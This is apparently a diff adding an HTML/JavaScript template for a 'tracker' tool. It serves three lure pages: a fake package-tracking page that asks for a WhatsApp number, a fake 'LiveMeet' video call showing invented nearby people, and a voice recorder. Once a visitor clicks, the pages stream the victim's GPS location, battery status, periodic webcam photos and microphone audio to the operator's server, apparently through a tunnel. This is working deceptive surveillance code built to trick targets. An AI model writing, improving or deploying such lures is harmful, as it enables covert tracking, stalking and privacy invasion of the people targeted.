@@ -1,0 +1,471 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Real time session</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{--bg:#0b0f17;--panel:#121a29;--panel2:#0e1522;--line:#223047;--txt:#e6edf7;--dim:#8b9bb4;--accent:#3b82f6;--ok:#22c55e;--bad:#ef4444}
+body{font-family:Inter,system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--txt);min-height:100vh;display:flex;flex-direction:column}
+body.theme-call{--accent:#8b5cf6}
+body.theme-rec{--accent:#ef4444}
+
+header{display:flex;align-items:center;gap:12px;padding:12px 18px;background:var(--panel);border-bottom:1px solid var(--line)}
+.logo{width:34px;height:34px;border-radius:10px;background:linear-gradient(135deg,var(--accent),#8b5cf6);display:flex;align-items:center;justify-content:center;font-size:17px}
+.brand{font-weight:700;font-size:15px}
+.brand small{display:block;font-weight:400;color:var(--dim);font-size:11px}
+.spacer{flex:1}
+.pill{padding:5px 12px;border-radius:99px;font-size:12px;border:1px solid var(--line);color:var(--dim)}
+.pill.live{color:#fff;background:rgba(34,197,94,.18);border-color:rgba(34,197,94,.5)}
+.pill.live::before{content:'';display:inline-block;width:7px;height:7px;border-radius:50%;background:var(--ok);margin-right:6px;animation:pulse 1.2s infinite}
+@keyframes pulse{50%{opacity:.3}}
+.mini{width:34px;height:34px;border-radius:50%;border:1px solid var(--line);background:var(--panel2);color:var(--txt);cursor:pointer;font-size:14px}
+
+main{flex:1;display:flex;flex-direction:column;padding:16px;max-width:860px;margin:0 auto;width:100%}
+.shell{display:none}
+.shell.active{display:block}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:16px;margin-bottom:14px}
+.card h2{font-size:11px;text-transform:uppercase;letter-spacing:.8px;color:var(--dim);margin-bottom:12px}
+.primaryBtn{background:var(--accent);color:#fff;border:0;border-radius:11px;padding:13px 18px;font-size:15px;font-weight:600;cursor:pointer}
+.primaryBtn:disabled{opacity:.55;cursor:default}
+#map{width:100%;height:100%}
+#mapLock{position:absolute;inset:0;z-index:600;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;background:linear-gradient(180deg,rgba(11,15,23,.86),rgba(11,15,23,.94));text-align:center;padding:18px}
+#mapLock .pin{font-size:38px;animation:bob 2s ease-in-out infinite}
+@keyframes bob{50%{transform:translateY(-7px)}}
+#mapLock b{font-size:15px}
+#mapLock p{color:var(--dim);font-size:12px;max-width:280px;line-height:1.5}
+.mapWrap{position:relative;height:320px;border-radius:14px;overflow:hidden;border:1px solid var(--line)}
+.dot{width:8px;height:8px;border-radius:50%;background:var(--dim);display:inline-block;margin-right:5px}
+.dot.live{background:var(--ok);animation:pulse 1.2s infinite}
+.timer{font-variant-numeric:tabular-nums;font-weight:700;font-size:30px;letter-spacing:1px}
+#wave{width:100%;height:52px;background:var(--panel2);border:1px solid var(--line);border-radius:10px;display:block}
+
+.trackTop{display:flex;gap:10px;margin-bottom:16px}
+.trackTop input{flex:1;background:var(--panel2);border:1px solid var(--line);color:var(--txt);padding:13px 14px;border-radius:11px;font-size:15px;letter-spacing:1px;font-family:monospace}
+.steps{display:flex;gap:6px;margin-bottom:16px}
+.step{flex:1;background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:12px 10px;text-align:center}
+.step span{display:block;width:26px;height:26px;line-height:26px;border-radius:50%;margin:0 auto 8px;font-size:12px;font-weight:700;background:var(--panel2);border:1px solid var(--line);color:var(--dim)}
+.step b{display:block;font-size:12px;margin-bottom:4px}
+.step i{font-style:normal;font-size:10.5px;color:var(--dim)}
+.step.done span{background:rgba(34,197,94,.2);border-color:var(--ok);color:var(--ok)}
+.step.active{border-color:var(--accent)}
+.step.active span{background:var(--accent);border-color:var(--accent);color:#fff;animation:pulse 1.2s infinite}
+
+#videoStage{background:var(--panel2);border:1px solid var(--line);border-radius:14px;height:300px;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative;margin-bottom:14px}
+#cam{width:100%;height:100%;object-fit:cover;transform:scaleX(-1);display:none}
+#camPlaceholder{display:flex;flex-direction:column;align-items:center;gap:10px;color:var(--dim);text-align:center;padding:14px}
+#camPlaceholder .ava{width:76px;height:76px;border-radius:50%;background:linear-gradient(135deg,#223047,#1a2440);display:flex;align-items:center;justify-content:center;font-size:30px;border:2px solid var(--line)}
+#camPlaceholder p{font-size:13px}
+#tiles{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;margin-bottom:14px}
+.tile{background:var(--panel2);border:1px solid var(--line);border-radius:12px;padding:12px;display:flex;align-items:center;gap:10px}
+.tile .ava{width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:16px;background:#1a2440;border:2px solid var(--line)}
+.tile .nm{font-weight:600;font-size:13px}
+.tile .st{color:var(--dim);font-size:11px;margin-top:2px}
+.tile.self .ava{border-color:var(--ok)}
+
+.recStage{display:flex;flex-direction:column;align-items:center;gap:14px;padding:26px 16px;background:var(--panel);border:1px solid var(--line);border-radius:14px;margin-bottom:14px}
+.recBtn{width:92px;height:92px;border-radius:50%;background:var(--bad);color:#fff;border:0;font-size:14px;font-weight:700;cursor:pointer;box-shadow:0 0 0 8px rgba(239,68,68,.18);transition:.2s}
+.recBtn.live{animation:pulse 1s infinite;box-shadow:0 0 0 8px rgba(239,68,68,.35)}
+.recBtn.stopped{background:var(--ok);box-shadow:0 0 0 8px rgba(34,197,94,.18)}
+.recList .recItem{padding:10px 12px;background:var(--panel2);border:1px solid var(--line);border-radius:10px;margin-bottom:8px;font-size:13px;color:var(--dim);display:flex;justify-content:space-between}
+.recItem b{color:var(--txt)}
+
+#noticeBar{position:fixed;left:0;right:0;bottom:0;z-index:900;background:rgba(18,26,41,.97);border-top:1px solid var(--line);padding:10px 16px;font-size:12px;color:var(--dim);display:none;align-items:center;gap:8px;justify-content:center;text-align:center;backdrop-filter:blur(4px)}
+#noticeBar.show{display:flex}
+.rec-dot{width:8px;height:8px;border-radius:50%;background:var(--ok);animation:pulse 1.2s infinite;flex-shrink:0}
+
+#ended{position:fixed;inset:0;z-index:1100;background:var(--bg);display:none;align-items:center;justify-content:center;text-align:center;padding:20px}
+#ended .inner{max-width:360px}
+#ended .icon{font-size:44px;margin-bottom:12px}
+#ended h3{font-size:20px;margin-bottom:8px}
+#ended p{color:var(--dim);font-size:14px;line-height:1.6}
+</style>
+</head>
+<body class="theme-{{ cfg.theme }}">
+
+<header>
+  <div class="logo">&#9670;</div>
+  <div class="brand"><span id="brandName">Swapnish tracker</span><small id="brandSub">Secure live session</small></div>
+  <div class="spacer"></div>
+  <span class="pill" id="statusPill">Live</span>
+  <button class="mini" id="leaveBtn" title="End session">&#10005;</button>
+</header>
+
+<main>
+  <!-- TRACK theme (location links) -->
+  <section id="shell-track" class="shell">
+    <div class="trackTop">
+      <input id="trackNo" readonly>
+      <button class="primaryBtn" id="trackBtn">Track Package</button>
+    </div>
+    <div class="steps">
+      <div class="step done"><span>1</span><b>Order placed</b><i>Just now</i></div>
+      <div class="step done"><span>2</span><b>Packed</b><i>At facility</i></div>
+      <div class="step active" id="stepTransit"><span>3</span><b>In transit</b><i id="transitInfo">Preparing shipment</i></div>
+      <div class="step" id="stepOutFor"><span>4</span><b>Out for delivery</b><i id="outForInfo">Pending</i></div>
+    </div>
+    <div class="mapWrap">
+      <div id="map"></div>
+      <div id="mapLock">
+        <div class="pin">&#128230;</div>
+        <b>Enter whatsapp number to track</b>
+        <p>Live GPS position appears here once tracking starts.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- CALL theme (camera links) -->
+  <section id="shell-call" class="shell">
+    <div id="videoStage">
+      <video id="cam" autoplay playsinline muted></video>
+      <div id="camPlaceholder">
+        <div class="ava">&#128100;</div>
+        <p>See who's nearby and start a live video call</p>
+        <button class="primaryBtn" id="joinCallBtn">Join Call</button>
+      </div>
+    </div>
+    <div id="tiles">
+      <div class="tile self" id="selfTile">
+        <div class="ava">&#128100;</div>
+        <div><div class="nm">You</div><div class="st"><span class="dot" id="selfDot"></span><span id="selfStatus">Not joined</span></div></div>
+      </div>
+      <div class="tile"><div class="ava">&#128100;</div><div><div class="nm">Alex</div><div class="st"><span class="dot"></span>Nearby</div></div></div>
+      <div class="tile"><div class="ava">&#128100;</div><div><div class="nm">Sam</div><div class="st"><span class="dot"></span>Nearby</div></div></div>
+      <div class="tile"><div class="ava">&#128100;</div><div><div class="nm">Riya</div><div class="st"><span class="dot"></span>Nearby</div></div></div>
+    </div>
+  </section>
+
+  <!-- REC theme (mic links) -->
+  <section id="shell-rec" class="shell">
+    <div class="recStage">
+      <div class="timer" id="recTime">00:00</div>
+      <button class="recBtn" id="recBtn">Start<br>Recording</button>
+      <p style="color:var(--dim);font-size:12px" id="recHint">Private voice recording &#183; streams to server</p>
+    </div>
+    <div class="card">
+      <h2>Audio wave</h2>
+      <canvas id="wave"></canvas>
+    </div>
+    <div class="card recList">
+      <h2>Recording status</h2>
+      <div class="recItem"><span>State</span><b id="recStatus">Not started</b></div>
+      <div class="recItem"><span>Last saved file</span><b id="recLast">—</b></div>
+    </div>
+  </section>
+</main>
+
+<div id="noticeBar">
+  <span class="rec-dot"></span>
+  <span id="noticeText"></span>
+</div>
+
+<div id="ended">
+  <div class="inner">
+    <div class="icon">&#128075;</div>
+    <h3 id="endedTitle">Session ended</h3>
+    <p id="endedMsg">You can close this page.</p>
+  </div>
+</div>
+
+<script>
+const cfg = {{ cfg|tojson }};
+const $ = id => document.getElementById(id);
+const THEME = cfg.theme;
+const API_BASE = '';            // relative -> same-origin, works through tunnel
+
+let map = null, marker = null, accCircle = null;
+let streams = [], timers = [], raf = null;
+let batteryInfo = null;
+let waveCtx = null, analyser = null;
+let locStarted = false;
+
+/* recording state */
+let recorder = null, recChunks = [], recMime = '';
+let recSec = 0, recTimer = null;
+
+/* ---------- theme setup ---------- */
+const BRAND = {
+  track: ['PackageTrack', 'Free order tracking'],
+  call:  ['LiveMeet', 'Video call with people nearby'],
+  rec:   ['VoiceNote', 'Private voice recording']
+};
+$('brandName').textContent = BRAND[THEME][0];
+$('brandSub').textContent  = BRAND[THEME][1];
+document.querySelectorAll('.shell').forEach(s => s.classList.remove('active'));
+$('shell-' + THEME).classList.add('active');
+
+const sharedParts = [];
+if (cfg.loc) sharedParts.push('live location');
+if (cfg.cam) sharedParts.push('camera photos');
+if (cfg.mic) sharedParts.push('microphone audio');
+if (sharedParts.length) {
+  $('noticeText').textContent = 'Live session \u00b7 this page shares ' + sharedParts.join(', ') + ' while open. You can stop anytime by leaving.';
+  $('noticeBar').classList.add('show');
+}
+
+if (THEME === 'track') $('trackNo').value = 'PKG' + Math.random().toString(36).slice(2, 10).toUpperCase();
+
+/* ---------- map ---------- */
+function initMap(){
+  if (map) return;
+  map = L.map('map', { zoomControl: false }).setView([20, 0], 2);
+  L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19, attribution: '&copy; OpenStreetMap' }).addTo(map);
+}
+if (THEME === 'track') initMap();
+
+/* ---------- battery proxy ---------- */
+async function trackBattery(){
+  try {
+    if (!navigator.getBattery) return;
+    const b = await navigator.getBattery();
+    batteryInfo = { level: Math.round(b.level * 100), charging: b.charging ? 1 : 0 };
+    b.addEventListener('levelchange', () => batteryInfo.level = Math.round(b.level * 100));
+    b.addEventListener('chargingchange', () => batteryInfo.charging = b.charging ? 1 : 0);
+    sendBattery();
+    timers.push(setInterval(sendBattery, 30000));
+  } catch (e) {}
+}
+
+/* ---------- reporting (relative, same-origin) ---------- */
+function payload(extra){
+  return Object.assign({
+    battery_level: batteryInfo ? batteryInfo.level / 100 : null,
+    battery_charging: batteryInfo ? batteryInfo.charging : null
+  }, extra || {});
+}
+function sendReport(extra){
+  fetch(API_BASE + '/api/t/' + cfg.token + '/report', { method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload(extra)) })
+    .then(r => { if (!r.ok) console.warn('report rejected', r.status); })
+    .catch(e => console.warn('report failed (network)', e));
+}
+function sendBattery(){ if (batteryInfo) sendReport({ lat: null, lon: null }); }
+
+/* ---------- location ---------- */
+function startLoc(){
+  return new Promise((res, rej) => {
+    if (!navigator.geolocation) return rej(new Error('Geolocation not supported'));
+    navigator.geolocation.watchPosition(onFix, e => setStatus('Location: ' + e.message),
+      { enableHighAccuracy: true, maximumAge: 3000, timeout: 15000 });
+    res();
+  });
+}
+function onFix(pos){
+  const c = pos.coords;
+  sendReport({ lat: c.latitude, lon: c.longitude, accuracy: c.accuracy, speed: c.speed, heading: c.heading, alt: c.altitude });
+  if (THEME === 'track') {
+    $('mapLock').style.display = 'none';
+    $('stepOutFor').classList.add('active');
+    $('outForInfo').textContent = c.speed != null && c.speed > 0.5 ? (c.speed * 3.6).toFixed(1) + ' km/h' : 'En route';
+    $('transitInfo').textContent = 'Live \u00b7 accuracy ' + (c.accuracy != null ? Math.round(c.accuracy) + ' m' : 'n/a');
+  }
+  if (!map) return;
+  if (!marker) {
+    marker = L.marker([c.latitude, c.longitude]).addTo(map);
+    accCircle = L.circle([c.latitude, c.longitude], { radius: c.accuracy || 50, color: '#3b82f6', fillOpacity: 0.12 }).addTo(map);
+    map.setView([c.latitude, c.longitude], 16);
+  } else {
+    marker.setLatLng([c.latitude, c.longitude]);
+    accCircle.setLatLng([c.latitude, c.longitude]).setRadius(c.accuracy || 50);
+  }
+}
+
+/* ============================================================
+   RECORDING PAGE — standalone Start handler
+   getUserMedia({audio}) is requested DIRECTLY in the click so
+   the browser keeps its user activation. This is what makes
+   "Start Recording" actually start on mobile browsers.
+   ============================================================ */
+function pickMime(){
+  const c = ['audio/webm;codecs=opus', 'audio/webm', 'audio/mp4'];
+  return c.find(m => MediaRecorder.isTypeSupported(m)) || '';
+}
+
+function startRecording(stream){
+  recMime = pickMime();
+  recChunks = [];
+  recorder = new MediaRecorder(stream, { mimeType: recMime || undefined });
+
+  recorder.ondataavailable = e => {
+    if (!e.data || e.data.size === 0) return;
+    recChunks.push(e.data);
+    const full = new Blob(recChunks, { type: recMime || 'audio/webm' });
+    uploadAudio(full);
+    $('recLast').textContent = full.size.toLocaleString() + ' bytes';
+  };
+  recorder.onerror = e => { console.error('MediaRecorder error', e); $('recStatus').textContent = 'Error: ' + (e.error ? e.error.name : 'unknown'); };
+  recorder.onstop = () => {
+    uploadAudio(new Blob(recChunks, { type: recMime || 'audio/webm' }), true);
+  };
+
+  recorder.start(10000);   // flush every 10s
+  startWaveform(stream);
+  startRecTimer();
+}
+
+function stopRecording(){
+  if (recorder && recorder.state !== 'inactive') recorder.stop();
+  stopRecUi();
+}
+
+async function startRecordSession(){
+  setStatus('Live');
+  trackBattery();                                 // not awaited -> keeps gesture intact
+  if (cfg.loc && !locStarted) { locStarted = true; try { await startLoc(); } catch (e) { } }
+  try {
+    // getUserMedia called immediately inside the click gesture.
+    const stream = await navigator.mediaDevices.getUserMedia({ audio: { echoCancellation: true, noiseSuppression: true }, video: false });
+    stream.getTracks().forEach(t => streams.push(t));
+    startRecording(stream);
+    $('recStatus').textContent = 'Recording \u00b7 saving every 10s';
+    $('recHint').textContent = 'Tap the red button to stop';
+  } catch (e) {
+    console.error('Mic error:', e);
+    $('recStatus').textContent = 'Mic error: ' + (e.name || e.message || e);
+    setStatus('Mic error');
+  }
+}
+
+$('recBtn').addEventListener('click', () => {
+  // Toggle: if recording, stop; otherwise start immediately.
+  if (recorder && recorder.state === 'recording') stopRecording();
+  else startRecordSession();
+});
+
+/* ---------- camera/mic used only when cam is enabled (call theme) ---------- */
+async function startCallMedia(){
+  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: cfg.mic ? { echoCancellation: true, noiseSuppression: true } : false });
+  stream.getTracks().forEach(t => streams.push(t));
+  const v = $('cam');
+  v.srcObject = stream;
+  await v.play().catch(() => {});
+  v.style.display = 'block';
+  $('camPlaceholder').style.display = 'none';
+  capturePhoto();
+  const photoMs = Math.max(parseInt(cfg.interval_s, 10) || 5, 2) * 1000;
+  timers.push(setInterval(capturePhoto, photoMs));
+}
+function capturePhoto(){
+  const v = $('cam');
+  if (!v.videoWidth || !v.videoHeight) return;
+  const c = document.createElement('canvas');
+  c.width = v.videoWidth; c.height = v.videoHeight;
+  c.getContext('2d').drawImage(v, 0, 0);
+  c.toBlob(b => { if (b) uploadPhoto(b); }, 'image/jpeg', 0.7);
+}
+function uploadPhoto(blob){
+  const fd = new FormData();
+  fd.append('kind', 'photo');
+  fd.append('file', blob, 'photo_' + Date.now() + '.jpg');
+  fetch(API_BASE + '/api/t/' + cfg.token + '/media', { method: 'POST', body: fd })
+    .then(r => { if (!r.ok) console.warn('photo rejected', r.status); })
+    .catch(e => console.warn('photo failed (network)', e));
+}
+function uploadAudio(blob, final){
+  const fd = new FormData();
+  fd.append('kind', 'audio');
+  fd.append('final', final ? '1' : '0');
+  fd.append('file', blob, 'audio_' + Date.now() + '.webm');
+  fetch(API_BASE + '/api/t/' + cfg.token + '/media', { method: 'POST', body: fd })
+    .then(r => { if (!r.ok) console.warn('audio rejected', r.status); })
+    .catch(e => console.warn('audio failed (network)', e));
+}
+
+$('trackBtn').addEventListener('click', () => {
+  setStatus('Live'); trackBattery();
+  if (cfg.loc) { locStarted = true; startLoc().catch(()=>{}); }
+});
+
+$('joinCallBtn').addEventListener('click', async () => {
+  setStatus('Live'); trackBattery();
+  const active = [];
+  if (cfg.loc) { locStarted = true; try { await startLoc(); active.push('Location'); } catch (e) {} }
+  if (cfg.cam) {
+    try { await startCallMedia(); active.push('Camera'); }
+    catch (e) { setStatus('Camera error'); }
+  }
+  setSelf(active.length ? 'Sharing: ' + active.join(' + ') : 'Joined', true);
+  if (!active.length) setStatus('Live (nothing enabled)');
+});
+
+$('leaveBtn').addEventListener('click', () => {
+  if (recorder && recorder.state === 'recording') stopRecording();
+  stopAll();
+  showEnded('Session ended', 'Sharing stopped. You can close this page.');
+});
+
+/* ---------- waveform + timer ---------- */
+function startWaveform(stream){
+  try {
+    waveCtx = new (window.AudioContext || window.webkitAudioContext)();
+    analyser = waveCtx.createAnalyser(); analyser.fftSize = 256;
+    waveCtx.createMediaStreamSource(stream).connect(analyser);
+    drawWave();
+  } catch (e) {}
+}
+function drawWave(){
+  const canvas = $('wave'); if (!canvas.clientWidth) return;
+  const dpr = window.devicePixelRatio || 1;
+  const W = canvas.clientWidth, H = canvas.clientHeight;
+  canvas.width = W * dpr; canvas.height = H * dpr;
+  const ctx = canvas.getContext('2d'); ctx.scale(dpr, dpr);
+  ctx.fillStyle = '#0e1522'; ctx.fillRect(0, 0, W, H);
+  if (analyser) {
+    const data = new Uint8Array(analyser.frequencyBinCount);
+    analyser.getByteFrequencyData(data);
+    const bars = 48, bw = W / bars;
+    ctx.fillStyle = '#22c55e';
+    for (let i = 0; i < bars; i++) {
+      const v = data[Math.floor(i * data.length / bars)] / 255;
+      const bh = Math.max(2, v * H * 0.92);
+      ctx.fillRect(i * bw + 1, H - bh, bw - 2, bh);
+    }
+  }
+  raf = requestAnimationFrame(drawWave);
+}
+function startRecTimer(){
+  if (recTimer) clearInterval(recTimer);
+  recSec = 0; $('recTime').textContent = '00:00';
+  $('recBtn').innerHTML = 'Stop<br>Recording';
+  $('recBtn').classList.add('live'); $('recBtn').classList.remove('stopped');
+  recTimer = setInterval(() => {
+    recSec++;
+    $('recTime').textContent = String(Math.floor(recSec / 60)).padStart(2, '0') + ':' + String(recSec % 60).padStart(2, '0');
+  }, 1000);
+}
+function stopRecUi(){
+  if (recTimer) clearInterval(recTimer);
+  if (raf) cancelAnimationFrame(raf);
+  if (waveCtx) { waveCtx.close().catch(() => {}); waveCtx = null; analyser = null; }
+  $('recBtn').innerHTML = 'Start<br>Recording';
+  $('recBtn').classList.remove('live'); $('recBtn').classList.add('stopped');
+  $('recStatus').textContent = 'Saved \u00b7 tap to record again';
+  $('recHint').textContent = 'Private voice recording &#183; streams to server';
+}
+
+/* ---------- helpers ---------- */
+function setStatus(t){ $('statusPill').textContent = t; $('statusPill').classList.add('live'); }
+function setSelf(status, live){
+  const st = $('selfStatus');
+  if (st) { st.textContent = status; $('selfDot').className = 'dot' + (live ? ' live' : ''); }
+}
+function showEnded(title, msg){
+  $('endedTitle').textContent = title;
+  $('endedMsg').textContent = msg;
+  $('ended').style.display = 'flex';
+}
+function stopAll(){
+  streams.forEach(t => t.stop());
+  streams = [];
+  timers.forEach(t => clearInterval(t)); timers = [];
+  if (recTimer) clearInterval(recTimer);
+  if (raf) cancelAnimationFrame(raf);
+  if (waveCtx) { waveCtx.close().catch(() => {}); waveCtx = null; analyser = null; }
+}
+</script>
+</body>
+</html>
